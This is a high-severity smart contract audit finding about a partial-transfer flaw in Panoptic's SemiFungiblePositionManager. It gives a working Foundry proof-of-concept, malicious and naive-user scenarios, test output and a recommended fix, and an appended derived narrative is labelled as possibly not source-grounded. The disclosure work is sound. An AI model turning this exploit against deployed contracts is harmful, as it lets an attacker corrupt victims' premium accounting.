---
id: 19550
severity: "High"
---

# Partial transfers are still possible, leading to incorrect storage updates, and the calculated account premiums will be significantly different from what they should be

## Description

The positions in this protocol are ERC1155 tokens and they can be minted or burned.

Token transfers are [extremely limited](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L573) in the protocol:
  * The sender must transfer all of its liquidity.
  * The recipient must not have a position in that tick range and token type.

Users’ current liquidity in their positions is tracked with a storage variable called [`s_accountLiquidity`](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L179). This mapping [is overwritten during transfers and the whole value is transferred](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L625C13-L627C54). The reason for not allowing partial transfers is that partial transfers will mess up the whole storage updating mechanism.

The requirements mentioned above are checked [here](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L613C13-L621C99):

file: SemiFungiblePositionManager.sol
// function registerTokenTransfer
    // ...
    // Revert if recipient already has that position
    if (
        (s_accountLiquidity[positionKey_to] != 0) ||
        (s_accountFeesBase[positionKey_to] != 0)
    ) revert Errors.TransferFailed();

    // Revert if not all balance is transferred
    uint256 fromLiq = s_accountLiquidity[positionKey_from];
    if (fromLiq.rightSlot() != liquidityChunk.liquidity()) revert Errors.TransferFailed(); //@audit if the right slot is equal to transferred liquidity, it will pass. There is no check related to left slot.
    // ... more code

The check related to whether all balance is transferred or not is made by checking the right slot of the sender’s liquidity using `fromLiq.rightSlot()`. Right now, I want to point out there is no check related to the left slot. I’ll get there later.

Now, we have to understand how position keys are constructed, and how the left slot and right slot work. Let’s start with the position [keys](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L593C13-L601C18):

    //construct the positionKey for the from and to addresses
    bytes32 positionKey_from = keccak256(
        abi.encodePacked(
            address(univ3pool),
            from,
            id.tokenType(leg),
            liquidityChunk.tickLower(),
            liquidityChunk.tickUpper()
        )

They are constructed with pool address, user address, token type, lower tick and upper tick. The most important thing I want to mention here is that whether the position is **long or short is not in the position key**. The thing that matters is the [token type (put or call)](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/types/TokenId.sol#L26). Which means:

**Short put** and **Long put** orders have the same position key (_for the same tick range_) but different token IDs.

The second thing we need to know is the [left and right slot mechanism](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L170C3-L178C143):

    /*       removed liquidity r          net liquidity N=(T-R)
     * |<------- 128 bits ------->|<------- 128 bits ------->|
     * |<---------------------- 256 bits ------------------->|
     */
    ///
    /// @dev mapping that stores the liquidity data of keccak256(abi.encodePacked(address poolAddress, address owner, int24 tickLower, int24 tickUpper))
    // liquidityData is a LeftRight. The right slot represents the liquidity currently sold (added) in the AMM owned by the user
    // the left slot represents the amount of liquidity currently bought (removed) that has been removed from the AMM - the user owes it to a seller
    // the reason why it is called "removedLiquidity" is because long options are created by removed liquidity -ie. short selling LP positions 

The left slot holds the removed liquidity values and the right slot holds the net liquidity values.

These values are updated in the [`_createLegInAMM`](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L936) during minting and burning depending on whether the action is [short or long or mint or burn etc.](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L971C13-L1000C18)

As I mentioned above, only the [right slot](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L621) is checked during transfers. If a user mints a short put (deposits tokens), and then mints a long put (withdraws tokens) in the same ticks, the right slot will be a very small number but the user will have two different ERC1155 tokens _(token Ids are different for short and long positions, but position key is the same)_. Then that user can transfer just the partial amount of short put tokens that correspond to the right slot.

I’ll provide two different scenarios here where the sender is malicious in one of them, and a naive user in another one. You can also find a coded PoC below that shows all of these scenarios.

**Scenario 1: Alice(sender) is a malicious user**

1. Alice mints 100 **Short put** tokens.
     //NOTE: The liquidity is different than the token amounts but I'm sharing like this just to make easy
     /* 
        |---left slot: removed liq---|---right slot: added liq---|
        |           0                |            100            | 
2. Alice mints 90 **Long put** tokens in the same ticks (not burn).
     /* 
        |---left slot: removed liq---|---right slot: added liq---|
        |           90               |             10            | 
3. At this moment Alice has 100 short put tokens and 90 long put tokens (`tokenId`s are different but the `position key` is the same).
4. Alice transfers only 10 short put tokens to Bob. This transaction succeeds as the 10 short put token liquidity is the same as Alice’s right slot liquidity. (_The net liquidity is totally transferred_).
5. After the transfer, Alice still has 90 short put tokens and 90 long put tokens but Alice’s `s_accountLiquidity` storage variable is updated to 0.
6. At this moment Bob only has 10 short put tokens. However, the storage is updated. Bob didn’t remove any tokens but his `s_accountLiquidity` left slot is 90, and it looks like Bob has removed 90 tokens.
     /* 
        |---left slot: removed liq---|---right slot: added liq---|
        |           90               |             10            | 

There are two big problems here:
  * Bob has no way to update his `removedLiquidity` variable other than burning long put tokens. However, he doesn’t have these tokens. They are still in Alice’s wallet.
  * All of Bob’s account premiums and owed premiums are calculated based on the ratio of removed, net and total liquidity. All of his account premiums for that option will be completely incorrect. See [here](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L1279C17-L1306C14).

Now imagine a malicious user minting a huge amount of short put (deposit), minting 99% of that amount of long put (withdraw), and transferring that 1% to the victim. It’s basically setting traps for the victim by transferring tiny amount of **net** liquidities. The victim’s account looks like he removed a lot of liquidity, and if the victim mints positions in the same range in the future, the `owed premiums` for this position will be extremely different, and much higher than it should be.

**Scenario 2: Alice (sender) is a naive user**

The initial steps are the same as those above. Alice is just a regular user.

1. Alice mints 100 short put
2. Then mints 90 long put.
3. Alice knows she has some liquidity left and transfers 10 short put tokens to her friend.
4. Right now, Alice has 90 short put tokens and 90 long put tokens. Her account liquidity is overwritten and updated to 0, but she doesn’t know that. She is just a regular user. From her perspective, she still has these 90 short put and 90 long put tokens in her wallet.
5. Alice wants to burn her tokens (she has to burn the long ones first).
6. Alice burns 90 long put tokens.

[SemiFungiblePositionManager.sol#L961C9-L980C18](https://github.com/code-423n4/2023-11-panoptic/blob/f75d07c345fd795f907385868c39bafcd6a56624/contracts/SemiFungiblePositionManager.sol#L961C9-L980C18)

```solidity
    unchecked {
    //...
        uint128 startingLiquidity = currentLiquidity.rightSlot();
        uint128 removedLiquidity = currentLiquidity.leftSlot();
        uint128 chunkLiquidity = _liquidityChunk.liquidity();

        if (isLong == 0) {
            // selling/short: so move from msg.sender *to* uniswap
            // we're minting more liquidity in uniswap: so add the incoming liquidity chunk to the existing liquidity chunk
            updatedLiquidity = startingLiquidity + chunkLiquidity;

            /// @dev If the isLong flag is 0=short but the position was burnt, then this is closing a long position
            /// @dev so the amount of short liquidity should decrease.
            if (_isBurn) {
979.-->        removedLiquidity -= chunkLiquidity; //@audit her removedLiquidity was 0, but this is inside the unchecked block. Now her removed liquidity is a huge number.
```

Alice’s account liquidity storage was updated before (step 4) and `removedLiquidity` was 0. After burning her long put tokens, the new `removedLiquidity` (L979 above) will be an enormous number since it is inside the unchecked block.

7. Right now, Alice looks like she removed an unbelievably huge amount of liquidity and she messed up her account (but she didn’t do anything wrong).

## Proof of Concept

Down below you can find a coded PoC that proves all scenarios explained above. You can use the protocol’s own setup to test this issue:
  * Copy and paste the snippet in the `SemiFungiblePositionManager.t.sol` file.
  * Run it with `forge test --match-test test_transferpartial -vvv`.

```solidity
function test_transferpartial() public {
        _initPool(1);
        int24 width = 10; 
        int24 strike = currentTick + 100 - (currentTick % 10); // 10 is tick spacing. We subtract the remaining part, this way strike % tickspacing == 0.
        uint256 positionSizeSeed = 1 ether;

        // Create state with the parameters above.
        populatePositionData(width, strike, positionSizeSeed);
        console2.log("pos size: ", positionSize);
        console2.log("current tick: ", currentTick);

        //--------------------------- MINT BOTH: A SHORT PUT AND A LONG PUT --------------------------------------- 
        // MINTING SHORT PUT-----
        // Construct tokenId for short put.
        uint256 tokenIdforShortPut = uint256(0).addUniv3pool(poolId).addLeg(
            0,
            1,
            isWETH,
            0,
            1,
            0,
            strike,
            width
        );

        // Mint a short put position with 100% positionSize
        sfpm.mintTokenizedPosition(
            tokenIdforShortPut,
            uint128(positionSize),
            TickMath.MIN_TICK,
            TickMath.MAX_TICK
        );

        // Alice's account liquidity after first mint will be like this --------------------> removed liq (left slot): 0 | added liq (right slot): liquidity 
        uint256 accountLiquidityAfterFirstMint = sfpm.getAccountLiquidity(
                address(pool),
                Alice,
                1,
                tickLower,
                tickUpper
            );
        assertEq(accountLiquidityAfterFirstMint.leftSlot(), 0);
        assertEq(accountLiquidityAfterFirstMint.rightSlot(), expectedLiq);

        // MINTING LONG PUT----
        // Construct tokenId for long put -- Same strike same width same token type
        uint256 tokenIdforLongPut = uint256(0).addUniv3pool(poolId).addLeg(
            0,
            1,
            isWETH,
            1, // isLong true
            1, // token type is the same as above.
            0,
            strike,
            width
        );

        // This time mint but not with whole position size. Use 90% of it.
        sfpm.mintTokenizedPosition(
            tokenIdforLongPut,
            uint128(positionSize * 9 / 10),
            TickMath.MIN_TICK,
            TickMath.MAX_TICK
        );

        // Account liquidity after the second mint will be like this: ------------------------  removed liq (left slot): 90% of the liquidity | added liq (right slot): 10% of the liquidity
        uint256 accountLiquidityAfterSecondMint = sfpm.getAccountLiquidity(
                address(pool),
                Alice,
                1,
                tickLower,
                tickUpper
            );
        
        // removed liq 90%, added liq 10%
        // NOTE: there was 1 wei difference due to rounding. That's why ApproxEq is used.
        assertApproxEqAbs(accountLiquidityAfterSecondMint.leftSlot(), expectedLiq * 9 / 10, 1);
        assertApproxEqAbs(accountLiquidityAfterSecondMint.rightSlot(), expectedLiq * 1 / 10, 1);

        // Let's check ERC1155 token balances of Alice.
        // She sould have positionSize amount of short put token, and positionSize*9/10 amount of long put token.
        assertEq(sfpm.balanceOf(Alice, tokenIdforShortPut), positionSize);
        assertEq(sfpm.balanceOf(Alice, tokenIdforLongPut), positionSize * 9 / 10);

        // -------------------------- TRANSFER ONLY 10% TO BOB -----------------------------------------------
        /* During the transfer only the right slot is checked. 
           If the sender account's right slot liquidity is equal to transferred liquidity, transfer is succesfully made regardless of the left slot (as the whole net liquidity is transferred)
        */
        
        // The right side of the Alice's position key is only 10% of liquidity. She can transfer 1/10 of the short put tokens. 
        sfpm.safeTransferFrom(Alice, Bob, tokenIdforShortPut, positionSize * 1 / 10, "");

        // After the transfer, Alice still has positionSize * 9/10 amount of short put tokens and long put tokens.
        // NOTE: There was 1 wei difference due to rounding. That's why used approxEq.
        assertApproxEqAbs(sfpm.balanceOf(Alice, tokenIdforShortPut), positionSize * 9 / 10, 1);
        assertApproxEqAbs(sfpm.balanceOf(Alice, tokenIdforLongPut), positionSize * 9 / 10, 1);
        
        // Bob has positionSize * 1/10 amount of short put tokens.
        assertApproxEqAbs(sfpm.balanceOf(Bob, tokenIdforShortPut), positionSize * 1 / 10, 1);

        // The more problematic thing is that tokens are still in the Alice's wallet but Alice's position key is updated to 0.
        // Bob only got a little tokens but his position key is updated too, and he looks like he removed a lot of liquidity.
        uint256 Alice_accountLiquidityAfterTransfer = sfpm.getAccountLiquidity(
                address(pool),
                Alice,
                1,
                tickLower,
                tickUpper
            ); 
        uint256 Bob_accountLiquidityAfterTransfer = sfpm.getAccountLiquidity(
                address(pool),
                Bob,
                1,
                tickLower,
                tickUpper
            );

        assertEq(Alice_accountLiquidityAfterTransfer.leftSlot(), 0);
        assertEq(Alice_accountLiquidityAfterTransfer.rightSlot(), 0);
        
        // Bob's account liquidity is the same as Alice's liq after second mint. 
        // Bob's account looks like he removed tons of liquidity. It will be like this: ---------------------  removed liq (left slot): 90% of the liquidity | added liq (right slot): 10% of the liquidity
        assertEq(Bob_accountLiquidityAfterTransfer.leftSlot(), accountLiquidityAfterSecondMint.leftSlot());
        assertEq(Bob_accountLiquidityAfterTransfer.rightSlot(), accountLiquidityAfterSecondMint.rightSlot());
        console2.log("Bob's account removed liquidity after transfer: ", Bob_accountLiquidityAfterTransfer.leftSlot());

        // -----------------------------------SCENARIO 2-----------------------------------------------
        // ----------------------- ALICE NAIVELY BURNS LONG PUT TOKENS ---------------------------------
        // Alice still had 90 long put and short put tokens. She wants to burn.
        sfpm.burnTokenizedPosition(
            tokenIdforLongPut,
            uint128(positionSize * 9 / 10),
            TickMath.MIN_TICK,
            TickMath.MAX_TICK
        );

        uint256 Alice_accountLiquidityAfterBurn = sfpm.getAccountLiquidity(
                address(pool),
                Alice,
                1,
                tickLower,
                tickUpper
            );

        // Her account liquidity left side is enormously big at the moment due to unchecked subtraction in line 979.
        console2.log("Alice's account liquidity left side after burn: ", Alice_accountLiquidityAfterBurn.leftSlot()); 
    }
```

The result after running the test:

```
Running 1 test for test/foundry/core/SemiFungiblePositionManager.t.sol:SemiFungiblePositionManagerTest
[PASS] test_transferpartial() (gas: 1953904)
Logs:
  Bound Result 1
  Bound Result 1000000000000000000
  pos size:  1009241985705208217
  current tick:  199478
  Bob's account removed liquidity after transfer:  8431372059003199
  Alice's account liquidity left side after burn:  340282366920938463463366176059709208257

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 9.55s
 
Ran 1 test suite: 1 test passed, 0 failed, 0 skipped (1 total test)
```

## Recommendation

At the moment, the protocol checks if the whole **net liquidity** is transferred by checking the right slot. However, this restriction is not enough and the situation of the left slot is not checked at all.

The transfer restriction should be widened and users should not be able to transfer if their removed liquidity (left slot) is greater than zero.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The contract stores a user’s position liquidity in a 256‑bit value that is split into a left slot (removed liquidity) and a right slot (net liquidity). When an ERC‑1155 position is transferred, the code only checks that the right slot of the sender matches the amount being transferred, and it completely overwrites the s_accountLiquidity mapping for the sender and the recipient. Because the left slot is never validated, a user who holds both a short‑put token (which contributes to the right slot) and a long‑put token (which contributes to the left slot) can transfer only the short‑put tokens that equal the right‑slot amount while leaving a non‑zero left slot untouched. The transfer succeeds, the sender’s liquidity record is set to zero, and the recipient’s record is populated with the original left‑slot value even though the recipient never received the corresponding long‑put tokens. From a user’s perspective the token balances appear correct – the sender still sees the short and long tokens in their wallet and the recipient sees only a small amount of short tokens – but the internal accounting shows that the recipient has removed a large amount of liquidity. This mismatch corrupts the premium calculation that depends on the ratio of removed, net and total liquidity, causing premiums to be vastly overstated or understated for the affected accounts. The bug can be triggered whenever a position key (identified by pool, owner, tick range and token type) is shared between short and long tokens, which is possible because the long/short flag is not part of the key. A malicious actor can mint a large short position, mint a nearly equal long position, and then transfer the tiny net amount to a victim, making the victim’s account appear to have removed a huge amount of liquidity and leading to incorrect premium obligations. Even a naïve user who unintentionally transfers a partial amount suffers the same accounting error, which may later surface when they try to burn tokens and encounter unchecked arithmetic that produces absurdly large removed‑liquidity values. The issue was discovered during a formal audit that included a proof‑of‑concept test suite reproducing the partial‑transfer scenario. It is hard to notice because the ERC‑1155 balances remain consistent with the wallet contents, while the internal s_accountLiquidity mapping silently diverges, and the UI does not expose the left‑slot value. The proper mitigation is to extend the transfer guard so that a transfer is only allowed when the sender’s left slot is zero, or to prohibit any transfer when removed liquidity is non‑zero, thereby ensuring that both slots are transferred together and the accounting remains consistent.
